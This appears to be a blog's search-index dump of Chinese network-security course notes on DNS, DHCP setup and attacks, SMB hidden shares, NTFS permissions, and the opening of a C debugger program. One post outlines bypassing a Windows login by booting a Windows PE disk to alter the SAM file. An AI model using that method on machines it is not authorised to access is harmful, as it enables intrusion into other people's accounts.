/flushdns对DNS缓存进行刷新，防止之前查询的数据造成干扰，但是这个刷新缓存仅仅是针对当前主机的，DNS污染是对大部分用户所访问的当地的DNS服务器进行投毒，对这些DNS服务器的缓存进行投毒，这种投毒效果往往更好，原因是，为了降低网络上的流量压力，地区的DNS服务器会记录更高层的DNS服务器过去的解析记录。而这些解析记录就存在地区DNS服务器的缓存里，一旦缓存被人做了手脚，那就没法正常访问想要访问的网站了。墙的原理，便是如此。 端口小结本篇新学习了与DNS相关的53端口，按照学习顺序，这里再作总结： Code123453389端口： 远程桌面23端口： telnet445端口: 共享服务UDP67,68: DHCP 53端口: DNS 参考资料参考教程： 千峰网络开源课p29~p30 打开虚拟机时报错 参考链接： beglage笔记 维基百科：顶级域名 维基百科：二级域名 DNS相关图源","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网路安全基础05(上)：DHCP","slug":"网路安全基础05-上-DHCP","date":"2020-09-25T09:32:09.000Z","updated":"2022-05-17T15:42:09.341Z","comments":true,"path":"2020/09/25/网路安全基础05-上-DHCP/","link":"","permalink":"http://cata1oc.github.io/2020/09/25/%E7%BD%91%E8%B7%AF%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8005-%E4%B8%8A-DHCP/","excerpt":"","text":"什么是DHCPDHCP作用DHCP（Dynamic Host Configuration Protocol）动态主机配置协议，是一个局域网的网络协议。作用是自动分配IP地址。 DHCP相关概念地址池：在Windows系统中又被称作作用域，其包含所有可分配的IP，并记录了已分配IP的相关信息（IP地址，子网掩码，网关，DNS，租期） 端口号：UDP 67，68 DHCP优点自动分配IP，减少工作量，避免IP冲突（人工配置IP），提高地址利用率。通常一家公司需要两台DHCP服务器，防止其中一台宕机后，出现无法上网的情况。 DHCP原理租约过程DHCP原理，也称为租约过程，分为如下4个步骤： 客户机发送DHCP Discovery广播包 客户机广播请求IP地址（包含客户机的MAC地址） 服务器响应DHCP Offer广播包 服务器响应并提供一个IP地址（不包含子网掩码，网关等参数） 客户机发送DHCP Request广播包 客户机选择IP（即确认使用哪个IP） 服务器发送DHCP ACK广播包 服务器确认租约，并提供网卡详细参数IP地址、子网掩码、网关、DNS、租期等 。 以上为DHCP租约过程，即客户机如何通过DHCP服务器获取到IP地址的过程。为了方便理解，以租房作为类比来概括这个过程： 例如一个打工人，相当于客户机，在北京打工，需要租房，即客户机需要IP地址，于是他在一个租房的论坛里发送了一条消息，说我要租房，这就是发送DHCP Discovery广播包，并留下自己的手机号，就是客户机的MAC地址。 此时，会有多个房东找它，告诉打工人，说我这里有房，并告知房子的地址，即服务器响应DHCP Offer包，由于是广播包，则有多个DHCP服务器会收到，只要它们的地址池有余，都会回复客户机，提供一个IP地址。 打工人收到很多房东的回应，但是第一个回应的才最有诚意，因此他只会选择第一个回应消息的房东，并去看房，看看房子环境怎样，是否卫生，距离公司远不远等等，即客户机确认使用哪个IP的过程，但一定会选择第一个。由于不是蛋壳公寓，打工人自然会满意，并在论坛回复房东说房子我租了，其它房东看到后，不再理睬打工人。即客户机发送DHCP Request广播包，告知提供IP地址的DHCP服务器，我使用你那个IP地址，其它DHCP服务器看到后，不再回复客户机。 最后提供房源的房东，会联系上打工人，并提供电卡，水卡，家门钥匙等重要物品。即服务器回复一个ACK广播包，包含了详细参数。 续约过程前面是租约过程，租约自然是有时限的，总不能租个房子租个几十年吧，通常都是半年至一年，因此也就有了续约。以NBA为例，续约一些明星球员，都会选择在合约进行到一半的时候续约，否则到了最后一年，万一这类球员跳槽到别的球队了，损失可就大了；房东亦是如此，也希望租客可以提早续约，否则就可能便宜了别的房东。因此，当租约时间超过50%以后，客户机会再次发送DHCP Request包，进行续约，即进行租约过程的后两步，当客户机收到服务器发送的ACK包后，租约时间会被设置为包中约定的时间，而不是累加在先前的时间上；如果服务器无响应，则继续使用并在租约时间达到87.5%，再次发送DHCP Request包，进行续约，若服务器仍 无响应，则释放IP地址，并重新发送DHCP Discovery广播包来获取IP地址，即重复一遍完整的租约过程。若无任何服务器响应Discovery广播包，则自动分配一个形如169.254.x.x/16的IP地址，该地址为全球统一无效地址，用于临时内网通信。 DHCP攻击与防御在DHCP协议诞生后，自然会衍生出基于其原理的攻击手段，这里简要介绍其二，以及对应的防御措施： 攻击DHCP服务器：频繁发送伪造DHCP请求（伪造MAC地址），直至将DHCP地址池资源耗尽。 防御措施：在交换机端口上做动态MAC地址绑定。这是管理型交换机才具备的功能，将端口与MAC地址动态绑定，这样从该端口发送出来的其它MAC地址的请求就不会被转发至DHCP服务器。 伪装成DHCP服务器进行攻击：黑客通过将自己的设备部署为DHCP服务器，为客户提供非法IP。致使用户无法上网。 防御措施：同样需要管理型交换机，除合法的DHCP服务器所在的接口外，全部设置为禁止发送DHCP Offer包。 DHCP实验（Windows）下面来进行DHCP相关实验，DHCP服务器部署可在不同平台上实现，本实验仅演示Windows平台，在之后的文章会演示Linux平台上DHCP服务器的部署。本次实验的环境为：服务器Windows 2003，客户机Windows XP。下面进入实验： 安装DHCP服务 开始->控制面板->管理工具，此时并没有DHCP服务，因此首先需要安装DHCP服务 开始->控制面板->添加或删除程序，单机添加/删除Windows组件，会进入Windows组件向导 找到网络服务，选择详细信息 找到动态主机配置协议，选中，点击确定，然后下一步。会进入安装过程 安装完毕后，开始->控制面板->管理工具，便可找到DHCP服务 此时进入命令行执行指令netstat -an，可以看到会多出2个UDP端口，67与68，这便是DHCP服务所使用的端口 部署DHCP服务器 这部分进行部署DHCP服务器的实验，首先给服务器配置IP，如下图所示： 接下来，打开之前安装的DHCP服务，选择当前主机，创建作用域（即地址池） 名称与描述随意填写即可 设置可分配的地址范围以及子网掩码，通常开头与末尾会保留一部分IP地址用于额外功能。这里地址范围所在的网段必须要与服务器本身的IP地址在同一个网段，实验才可成功。想要创建不同网段的作用域，需要之后进一步学习DHCP中继相关的知识才可进行。 接下来添加排除位于分配范围中，不想要分配的地址。在起始IP地址中输入，或者输入一个范围，并添加 接下来是租约期限，即租约过程中约定的时间长短，通常不宜设置太长 前面配置完地址池选项后，下面是DHCP相关选项，可以选择稍后配置 由于服务器设置了10.1.1.1作为IP，因此这里网关设置为10.1.1.254，当然也可以设置为别的，不影响 父域属于上古时期概念，这里不填。只需填写DNS服务器的IP，查询所在城市的DNS服务器即可，然后再添加一个通用的DNS服务器，例如114.114.114.114 WINS服务是Windows系统自己弄的一个类似DNS功能的老掉牙玩意，DNS诞生后就不再用了，直接跳过。 然后激活该作用域（地址池） 这时可以很方便看到地址池的相应信息 用户获取IP地址配置好DHCP服务器后，就可以让用户机获取IP地址了（该实验需要关闭防火墙，否则67，68端口是不被放行的）。在命令行中通过如下指令释放/获取IP： Code12ipconfig /release //释放IP(取消租约指令；手动配置IP时，也会取消租约)，相当于对本地连接禁用ipconfig /renew //重新获取IP(有IP时，发送Request包续约；无IP时，发送Discovery包获取)，即对本地连接重新启用 然后使用上述指令，释放后重新获取IP，并观察结果 发现，获取的IP仍然是原先释放的IP，并没有从DHCP服务器上获取到地址池中的IP，这是为何呢？在做这个实验前，我们已经将两台虚拟机放在同一个局域网VMnet1上，意味着它们之间是可以ping通的。但是在这个局域网内，仍然可能存在着其它DHCP服务器，当客户机发送Discovery广播包后，其它DHCP反应更快，立刻就发送了Offer包，所以客户机最终使用的是其它DHCP服务器提供的IP。因此，为了实验能成功，我们需要关闭其它的DHCP服务器，操作如下： 切换到客户机虚拟机，点击左上角菜单中的编辑->虚拟网络编辑器 发现该虚拟机的DHCP服务是启用的，我们要关闭它，选择下方的更改设置 找到当前主机，将使用本地DHCP服务将IP地址分配给虚拟机这个选项关闭，这样下次获取IP时就会从我们部署的DHCP服务器获取了。 此时，再通过指令释放并重新获取IP，就可以成功从我们先前部署的DHCP服务器的地址池中获取IP地址 这时，回到DHCP服务器，查看地址租约，就可以看到刚刚获取IP的客户机，注意这个唯一ID，实际上就是客户机的MAC地址。 下面回到客户机验证一下 地址保留什么是地址保留呢？例如在公司，老板希望自己的笔记本有一个独特的IP地址，别人都不能使用，只能自己使用，比如10.1.1.168，这种需求可以通过手工配置IP来解决，但问题是，一旦这个笔记本被带回家，那就无法上网了，因为在公司的网段与家里路由器的网段通常是不一样的。如果回家后想上网，又得再手动配置一次，回到单位后同样如此，这样反复发配置显得异常麻烦，因此，DHCP服务提供了地址动态保留的功能，让部分电脑每次申请IP时都分配固定的IP地址。具体操作如下： 找到保留，右键新建保留 需要填写部分信息，以及要分配的IP地址，其中MAC地址是判断客户机主要方式，回到客户机，查询MAC地址 然后完善保留信息 完成后，可以看到保留选项下多了一个条目。回到客户机，重新获取IP，即可获取到保留的地址 备份与还原接下来要介绍的就是备份与还原，一个DHCP服务器可能会包含多个作用域（地址池），一旦服务器宕机，就会有大量的用户受到影响，因此需要对作用域进行备份，若此时有一台正常运行的服务器，只需要将备份的内容还原到该服务器上，即可恢复之前所有受影响用户的IP使用情况。具体备份还原的操作如下： 选择当前服务器，右键->备份 新建一个文件夹，用来备份DHCP配置，这里在C盘新建了一个dhcp_backup文件夹，选择并确定 进入dhcp_backup文件夹，可以看到，存储着相应的配置文件信息。 这时我们先删除掉原先的作用域，此时只剩下一个空壳（这里注意不要删成服务器了，服务器删了只是暂时不显示了，进入命令行可以看到67，68端口号依旧是开着，重新打开DHCP，服务依旧在，若删了作用域，那才是真的删了） 右键服务器，选择还原，并选择刚刚备份的文件夹，确定。这样就可以恢复原先的地址池配置了，原先的数据也都还在。这里注意左上角服务器的小图标还是红色的，但实际上服务器已经打开了，这时选择右键刷新即可。 选项优先级关于选项优先级，这里顺带提一嘴 由图，这里创建了两个作用域，假设均未配置作用域选项，在这种有多个作用域的情况下，可以直接在服务器选项中配置DNS，这样每个作用域选项中的DNS也会继承服务器选项中的DNS，一台DHCP服务器的几个作用域共享一个DNS是没有问题的。如果想让某些作用域使用特定的DNS，方可在作用域选项中进行配置，这样就会替换掉原先继承的服务器选项中配置的DNS。以上仅限于DNS的配置，网关的配置依旧要单独在各个作用域中配置。 小结本篇实验均在Windows2003上实现，Windows2008上原理类似，自行实现以作练习。 参考资料参考课程： 千峰网安公开课 参考链接： beglage学习笔记 Windows2003DHCP服务器配置","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"实验：利用PE破解系统密码(待更新)","slug":"网络安全基础04-实验","date":"2020-09-24T05:45:17.000Z","updated":"2022-05-17T15:41:40.938Z","comments":true,"path":"2020/09/24/网络安全基础04-实验/","link":"","permalink":"http://cata1oc.github.io/2020/09/24/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8004-%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"前言在之前，学习过利用5次shift漏洞破解Win7登录密码，但是需要至少是Win7或者Win10，且存在该漏洞的系统才可以实现。本篇介绍另一种方式，在所有版本的Windows系统上都可以实现，利用PE破解系统密码。 原理SAM文件这里简要说明一下Windows的密码验证机制，用户的密码在经过哈希算法后，存储在SAM文件中，因而是不可逆的。在登录时，操作系统会把用户输入的密码经过同样的哈希算法后，拿去与SAM文件中存储的值作比较，若相同，则说明密码正确。通常来说，SAM文件中的值是无法还原成原本的密码的。只有管理员通过net user命令，才能去修改该密码。也因此，在开机过程中，是无法修改SAM文件中的值去破解密码。从而我们需要考虑另一个角度。 Windows PE系统首先需要介绍一下Windows PE系统，注意这不是PE文件，而是PE系统，这是一个基于不同版本Windows内核的微型操作系统，用于安装、部署和修复各个版本的Windows系统。例如Windows XP有对应的WinXP PE，Win7有对应的Win7 PE等等。 破解原理通常来说，我们是以硬盘启动操作系统的，之后插入U盘，操作系统就可以对U盘作任意修改并格式化。正是利用这个原理，我们将Windows PE系统刻录到一个U盘中(或者光盘)，将U盘作为启动盘来启动操作系统，这时候我们就会进入Windows PE这个微型操作系统中，此时，原本硬盘上的操作系统对于我们来说，就相当于是移动硬盘了。这时我们便可以随意修改文件或者格式化硬盘，包括可以修改SAM文件。从而达到破解登录密码的目的。这个方式是防不住的，只要有对应的PE启动盘就可以实现。 实验这里简单说明一下步骤，之后会补上完成流程 使用U深度增强版或其它类型刻录一个.iso的任意版本Windows PE 虚拟机->硬件设置->CD/DVD(IDE)->使用ISO映像文件，选择刚刚刻录的Windows PE 在虚拟机中选择打开电源时进入固件，进入BIOS，选择以CD/DVD启动，若刻录在U盘则选择USB启动 进入Windows PE，可作修改，例如破解WINDOWS登录密码 参考资料参考教程： 千峰网络安全课程","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全基础04(下)：文件共享服务器","slug":"网络安全基础04-下-文件共享服务器","date":"2020-09-23T11:21:13.000Z","updated":"2022-05-17T15:43:10.255Z","comments":true,"path":"2020/09/23/网络安全基础04-下-文件共享服务器/","link":"","permalink":"http://cata1oc.github.io/2020/09/23/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8004-%E4%B8%8B-%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8/","excerpt":"","text":"概述文件共享服务器，就是通过网络提供文件共享服务，提供文件下载和上传服务（类似于FTP服务器）。通常来说一个公司对外部公网会使用基于FTP协议的文件传输服务，对研发内网会使用基于CIFS协议的文件共享服务。 CIFS是由微软开发的一款SMB协议的衍生品，时至今日，CIFS实现的协议已经很少被使用，更多的则是经过升级的SMB2或SMB3。 创建共享探讨协议不是本篇的核心，重要的是了解共享文件的实现方式，下面直接开始实验，演示如何创建共享： （环境：Windows2003(服务器端)，Windows XP(客户端)） 第一步先将两台虚拟机放到同一个网络中，这里将XP与2003的网络适配器一项均设置为VMnet1。然后配置两个虚拟机的IP地址，让它们位于同一网段中。关掉防火墙，保证可以ping通。 接下来进入C盘新建一个文件夹，右键属性->共享，选择共享此文件夹，并设置共享名。点击确定，这样该文件夹就变成了一个共享文件夹。 设置完后，会发现该文件夹图标下面多了一个小手，就是共享文件夹的标志，接下来可以在文件夹中创建文件，图片等资源。便可让其它用户访问。 访问共享在了解了如何创建共享，接下来就是如何访问共享。 （环境：Windows2003(服务器端)，Windows XP(客户端)） 老规矩，第一步，在Windows 2003上创建一个用户账号 Win+R进入运行窗口，输入服务器的地址，格式如下： Code12\\\\10.1.1.2这里服务器的地址为10.1.1.2，加上\"\\\\\"用来说明访问的是CIFS服务 接着会尝试链接到服务器，再输入方才创建的用户，并确认。 接下来会进入到服务器上的共享文件夹，可以看到，用户访问共享文件夹看到的是文件夹的共享名，并不是真实的文件夹名，同时可以进入共享文件夹中查看共享的文件。 需要说明的是，在登入共享服务器后，短期内再登录是会自动登录共享服务器的，不需要再次输入账号密码，因此如果试图换一个用户访问共享服务器，需要注销当前用户再登入，不过大多数情况下不需要考虑这点。 共享权限在了解了创建共享与访问共享后，下面介绍一下共享文件的权限。例如，当我们试图删除共享文件夹上的文件时，就会出现如下错误。 有意思的是，出现了写拷贝错误，写拷贝我们在学习内核时遇到过，防止进程修改文件，从而将物理页属性为写拷贝的文件复制到一个新的物理页上，让进程指向新的物理页，这样就不会导致原本的文件被修改了。扯多了~~ 回到共享权限上来，回到Windows 2003上，共享文件夹右键->属性->权限，这就是共享文件夹的权限列表了，可以看到有一个Everyone组，它这里一共就只有3个权限。 那么是如何计算用户访问共享文件夹时的权限呢？这里给出结论： 当用户由远程登录时（本例：通过Windows XP登录）：将共享文件夹的权限与NTFS权限取交集，为用户最终的权限。 当用户由本地登录时（本例：通过Windows 2003登录）：仅受到文件NTFS权限的影响。 在共享文件夹中，由于文件的ACL的User组里没有给修改权限，因此用户删除不了图片。 如果想要用户能够删除，添加共享文件夹中的文件，只需要修改NTFS权限就可以（取消继承，单独给用户或者用户所在组设置权限），一般情况下，共享权限都会给完全控制，这样看的就也是文件本身的NTFS权限了。另一个要说明的是，若用户单独被拿出来设置NTFS权限，这个权限给的不是用户，而是用户的SID，通过指令 Code1whoami /user 查看当前用户的SID。 隐藏共享什么是隐藏共享？在命令行键入指令 Code1net share 便可以查看该系统中所有共享文件夹。其中后面带$符号的就属于隐藏共享。 可以看到，我们唯一的分区C盘，以及C盘下的目录均被设置为了共享，这其实是非常可怕的，这意味着它人在知道了域管理员账号密码的情况下，可以远程访问服务器内所有的文件内容。微软当初设计时，是为了方便用户能够远程控制自己的电脑，但实际上，没有多少人用这些功能，反倒是方便了黑客。 关于工作环境方才提到了域管理员，这里简单说明一下。计算机中有一个工作组的概念，平时我们的工作组为WORKGROUP，如下图所示。 WORKGROUP是一种人人平等的工作组，但还有一种工作组，叫做域工作组，这种工作组里面有一个拥有至高无上权力的域管理员，可以不经过许可不知道密码的情况下登录域中任何的成员计算机。 访问隐藏共享访问隐藏共享与常规访问区别不大，仅需要添加一个$符号。然后输入账号密码登录即可。 设置隐藏共享设置隐藏共享也比较简单，类似赋值语句PHP的赋值语句，只是把$符号放到后面。如下图所示，重新给C盘设置隐藏共享： 关闭共享这隐藏共享开着显然不安全，大部分情况下是用不到的，而且还会给黑客可趁之机，下面就介绍几种关闭共享的办法。 临时关闭可以通过指令 Code1net share 共享名 /del 临时关掉共享。如下图所示： 但是这种关闭属于临时关闭，重启后，这些共享又会再次开启。 注册表关闭为了屏蔽系统隐藏共享自动开启的功能，需要使用注册表编辑器。Win+R，并输入regedit进入注册表编辑器。跟依次进入如下路径： Code1我的电脑\\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters 进入后，右键新建一个DWORD类型的值，并命名为AutoShareServer，将其值设置为0。 这样重启之后，就可以关闭之前临时关闭的共享文件夹了 关闭445端口经过先前的操作，共享文件夹都关闭了，但是还有一个隐藏共享的IPC未被关闭，这个比隐藏共享文件夹更加危险，所以我们得将其关掉。与之相关的，则是445端口，该端口就是与共享服务相关的端口，只需将其关闭，就可以防止因共享服务而受到攻击。 方法如下，Win+R，并输入services.msc，找到名称为Server，将其禁用。这样445端口的共享服务就给关了。 除了在服务中禁用掉Server，还有一种方法，仅能在Windows7或者Windows10这样高版本的系统管用，就是设置入站规则。在控制面板中，找到Windows Defender防火墙，选择高级设置，然后新建规则，类型选择端口，在特定本地端口填写445，选择阻止连接。由于TCP和UDP是分开应用的，因此要设置两遍。下面以TCP为例演示一遍如何设置： 端口小结至此，我们已经学习了3个端口的知识，这里稍作总结： Code1233389： 远程桌面23： telnet445: 共享服务 参考资料参考教程： 千峰网络安全课程 参考链接： beglage学习笔记 FTP与SMB/CIFS在文件共享上的异同","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"网络安全基础04(上)：NTFS权限","slug":"网络安全基础04-上-NTFS权限","date":"2020-09-22T08:15:28.000Z","updated":"2022-05-17T15:41:15.369Z","comments":true,"path":"2020/09/22/网络安全基础04-上-NTFS权限/","link":"","permalink":"http://cata1oc.github.io/2020/09/22/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%8004-%E4%B8%8A-NTFS%E6%9D%83%E9%99%90/","excerpt":"","text":"NTFS权限概述在之前学习的权限中，主要是应用层面的，例如远程访问权限，打印机使用权限，创建用户及修改密码权限等等。本篇要介绍的NTFS权限，是针对文件、文件夹而言的。其主要用途如下： 实现不同用户访问不同对象（文件、文件夹）的权限 给不同用户分配访问资源的权限（分配了正确的访问权限，用户才能访问其资源） 防止资源被篡改、删除 文件系统概述（实验环境：Windows7）文件系统即在外部存储设备上组织文件的方法。这种说法比较抽象，后面会有具体的例子助于理解。在Windows系统中，选择任意磁盘，右击属性，可以看到当前磁盘所使用的文件系统是什么，若分区不建立文件系统，则无法存储文件，磁盘可以看作是建立了文件系统后的分区。 常用的文件系统下面是常用文件系统以及主要使用它们的操作系统： Code12341.FAT Windows2.NTFS Windwos3.EXT4 Linux4.APFS MacOS 格式化我们经常提到的格式化是什么？例如经常说 “将U盘格式化，这样就能清空U盘了” 。实际上，格式化的本质就是制作文件系统。用一种比较形象的话来说就是，将分区内容抹除，再重新打格子(block)，可以理解为excel表格那样，每个格子大小通常为4KB（可以设置成别的大小）。例如要保存一个10KB的文件，就需要3个block，前2个占满，后1个占一半。如下图所示，Windows默认格式化为NTFS格式，默认一个block的大小是4KB。 当然除了用来存储内容的block，还有一个用来记录每个文件信息的主文件表（MFT：Master File Table），包括MFT本身，至少都有一个条目。有关文件的所有信息，包括文件的大小，时间和日期戳，权限和数据内容，都存储在MFT条目中或MFT条目描述的MFT外部空间中。随着文件添加到NTFS文件系统卷中，更多的条目将添加到MFT中，并且MFT的大小会增加。从NTFS文件系统卷中删除文件时，它们的MFT条目被标记为空闲，可以重复使用。但是，已分配给这些条目的磁盘空间不会重新分配，并且MFT的大小不会减少。其内部格式大致如下： 老师在课程中提到的inode，是属于Linux文件系统中的概念，在Windows的NTFS文件系统中起到类似功能的就是上面提到的MFT。 NTFS相比FAT的优势在早期的Windows系统中，主要使用的是FAT32文件系统，现如今都替换成了NTFS文件系统，相比于FAT32，NTFS有以下几点优势： 提高磁盘读写性能 可靠性高： 加密文件系统 访问控制列表（Access Control List），在磁盘中新建一个文件(或文件夹)，右键属性，进入安全，如下图所示，访问控制列表分为2个部分，一部分是用户或组的划分，即可以单独设置某个用户或者组是权限；另一部分则是该用户或组的权限。 提高磁盘利用率： 压缩 磁盘配额，用来限制不同用户的使用空间，通常管理服务器时会用到。 支持单个文件大于4个G，FAT文件系统是不支持大于4个G的单个文件的，因此有时会发现电脑中文件无法拷贝到U盘里，一个可能的原因是U盘格式化成了FAT文件格式。当然，一般16G以下的小型U盘，更建议格式化为FAT，效率更高。 修改NFTS权限（实验环境：Windows7）权限的含义修改NTFS权限，实际上就是修改文件(或文件夹)访问控制列表，那什么是访问控制列表呢？概括来讲，就是当前用户对该文件(或文件夹)所拥有的权限列表。它可以控制用户(或组)对文件(或文件夹)的行为，例如修改，删除，查看等。下面来看一下访问控制列表包含哪些权限： 文件权限 权限内容 完全控制 拥有读取、写入、修改、删除文件、及特殊权限 修改 拥有读取、写入、修改、删除文件的权限 读取和执行 拥有读取、及执行文件的权限 读取 拥有读取文件的权限 写入 拥有修改文件内容的权限 特殊权限 控制文件权限列表的权限 文件夹权限 权限内容 完全控制 拥有对文件及文件夹读取、写入、修改、删除文件、及特殊权限 修改 拥有对文件及文件夹读取、写入、修改、删除文件的权限 读取和执行 拥有对文件夹中的文件下载、读取、及执行文件的权限 列出文件夹内容 可以列出文件夹的内容 读取 拥有对文件夹中的文件下载、读取文件的权限 写入 拥有在文件夹中创建新的文件的权限 特殊权限 控制文件夹权限列表的权限 权限继承在了解了访问控制列表中各个权限的含义后，下面开始介绍NTFS权限的一些属性，首先要说到的是权限继承。这个比较好理解，就是任一文件夹下的所有文件的访问控制列表会继承该文件夹自身的访问控制链表，包括设置的组。如下图所示，在文件夹1目录下，新建文件a.txt，图像b.png，文件夹c，可以看到，文件夹1目录下的文件(或文件夹)均继承了文件夹1的访问控制列表的权限以及用户组（注：文件是没有列出属性的） 继承这一点很好理解，继承是默认进行的，但同样可以取消继承，操作如下所示，进入安全->高级->更改权限，将包括可从该对象的父项继承的权限上的勾去掉，此时会跳出一个警告，让你选择添加/删除。如果选择删除，就把这些组全删了；所以选择添加，则可以自由删减。 这里将Administrators以外的组都删掉了，此时Administrators组以外的用户都无法访问文件夹c了。这样通过取消继承，可以达到控制用户对文件夹的访问限制。 这里再补充一点，权限继承除了适用于当前分区（例如C盘）创建的文件(文件夹)，同样适用于复制或移动进来的文件。只有同分区移动文件(文件夹)不会被修改访问控制列表，其它情况与创建文件(或文件夹)是一样的。 权限累加前面看到访问控制列表，它既可以是用户的权限，也可以是组的权限。如果一个用户被单独设置了权限，而它又位于一个或多个组中，那么最终的权限是怎样的呢？答案就是权限累加，将用户自己的权限与所有组的权限加在一起，就是这个用户的最终权限。（这个实验比较简单，就不演示了） 权限剔除设想这样一个场景，公司中有一个工作组， 但是组里有一个员工是刺头，文件夹里有一个机密文件不想让这个刺头看到，那该怎么办呢？又不能把这个工作组都删掉，这样其它员工也就看不了。这时就要用到另一个机制，权限剔除。权限剔除的原理在于权限累加的过程中，拒绝是大于允许的。下面来看实验： 进入文件夹，先按照前面取消权限继承的步骤，令机密文件的访问控制列表取消对父文件夹的继承。这样就可以自行修改访问控制列表。 然后查看机密文件的ACL，发现User组中的成员是有读取和执行这个文件的权限的。并且刺头用户User0x1也位于Users组中。 为了不影响Users组中其它用户的正常权限，需要把用户User0x1权限单独列出来。右键机密文件属性->编辑->添加->高级->对象类型选择用户->立即查找，就可以看到所有用户，这里选择用户User0x1。 选择后，会显示设备名\\用户名的形式，这种形式用来确定某一个用户或者组。 现在来修改User0x1的权限，可以看到，此时User0x1的权限是允许读取和执行的，选择高级->更改权限->编辑，将原先允许的权限，全部更改为拒绝。 这时会跳出来一个警告，告诉你拒绝项优先于允许项，并且在权限项目列表中User0x1的类型也是拒绝。 可以看到User0x1此时的权限都是拒绝 这时再用User0x1去访问机密文件就会失败了，即使位于Users组中，但是由于拒绝项优先于允许项，还是会被拒绝访问。 取得所有权这个时候，被限制访问的User0x1不高兴了，很没有面子，为了把面子找回来，它决定创建一个除了自己，谁都无法访问的文件。ACL里只有User0x1自己，拥有所有权限。 此时即使切换到了管理员，也无法访问这个文件。 这就很过分了对不对，作为管理员，怎么能访问不了用户的权限呢？进入属性->安全，发现竟然看不了ACL，但是没关系，点击继续，发现可以修改文件的所有者，我们将原有的文件所有者User0x1更改为Admin用户或者Administrators这个组。这样就可以对这个文件的ACL进行修改了。 结果，可以正常打开文件，并且在用户和组中删掉了用户User0x1，User0x1反而打开不了自己创建的文件了。 强制继承什么是强制继承呢？前面介绍了取消权限继承，这导致文件夹1中各个文件的ACL可以自由修改以至于都不相同。 为了方便管理，管理员希望将这些文件重新恢复为取消继承之前的ACL，这里就要用到强制继承的功能了。右键文件夹1属性->安全->高级->更改权限->勾选使用可从此对象继承的权限替换所有子对象权限。（注意先让User0x1那个文件赋予Admin完全控制的权限），这样就可以让文件夹1中所有子文件(文件夹)均拥有与文件夹1一样的ACL。 修改完后查看两个文件，发现会和文件夹1的ACL相同。原来添加或删除的用户也不见了。这就是强制继承。 参考资料参考教程： 千峰网络安全工程师课程 参考连接： beglage笔记 inode与block(Linux系统) Windows官方文档-MFT MFT介绍","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"http://cata1oc.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"调试器模拟程序（持续更新）","slug":"调试器模拟程序","date":"2020-09-21T06:02:30.000Z","updated":"2022-05-17T15:40:45.154Z","comments":true,"path":"2020/09/21/调试器模拟程序/","link":"","permalink":"http://cata1oc.github.io/2020/09/21/%E8%B0%83%E8%AF%95%E5%99%A8%E6%A8%A1%E6%8B%9F%E7%A8%8B%E5%BA%8F/","excerpt":"","text":"前言目前已经完结了Windows内核系列的入门学习，在调试篇章中，每一部分都涉及到一个入门调试器的实验。每一步都是息息相关的，如果放在一起就有太多重复代码了，因此在介绍不同断点以及单步操作时，只是单独列出相应的代码，本篇则将那些代码整合起来，模拟一个简单的调试器程序。并且会在之后保持更新，逐渐完善这个调试器程序以保持对内核的熟悉，同时也会将之前的篇章引用这一篇的内容。 调试器代码该代码会在之后不断更新，完善功能，至全部完成时，会在最后简要概括逻辑。（目前仅软件断点功能可用，硬件断点及单步异常有一些问题，内存断点与单步步过功能暂未实现） 现在的问题主要是线程发生改变，原先的设置的TF位无法形成单步异常。硬件断点也是如此。 c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295// Debugger_OpenProcess.cpp : Defines the entry point for the console application.//#include \"stdafx.h\"#include \"windows.h\"//宏定义与全局变量#define dbgProcessName \"C:\\\\notepad.exe\"#define SystemInt3 0x7C92120E //系统断点，根据环境而改变typedef HANDLE (WINAPI *FnOpenThread) (DWORD dwDesiredAccess,BOOL bInheritHandle,DWORD dwThreadId);HANDLE hDebugeeThread;HANDLE hDebugeeProcess;BYTE OriginalCode; //恢复INT3断点时用到CREATE_PROCESS_DEBUG_INFO processInfo;//异常分发函数BOOL ExceptionHandler(DEBUG_EVENT* pDebugEvent);//异常处理函数BOOL Int3ExceptionProc(EXCEPTION_DEBUG_INFO* pExceptionInfo);BOOL SingleStepExceptionProc(EXCEPTION_DEBUG_INFO* pExceptionInfo);//断点设置函数VOID SetInt3BreakPoint();VOID SetHardBreakPoint(PVOID pAddress);VOID SetSingleStep();//工具函数BOOL WaitForUserCommand();BOOL IsSystemInt3(EXCEPTION_DEBUG_INFO* pExceptionInfo);int main(){ BOOL nIsConinue = TRUE; DEBUG_EVENT debugEvent = {0}; BOOL bRet = TRUE; DWORD dwContinue = DBG_CONTINUE; //1.创建调试进程; PROCESS_INFORMATION pInfo = {0}; STARTUPINFO startupInfo = {0}; GetStartupInfo(&startupInfo); //以Create方式创建调试链接 bRet = CreateProcess(dbgProcessName, NULL, NULL, NULL, 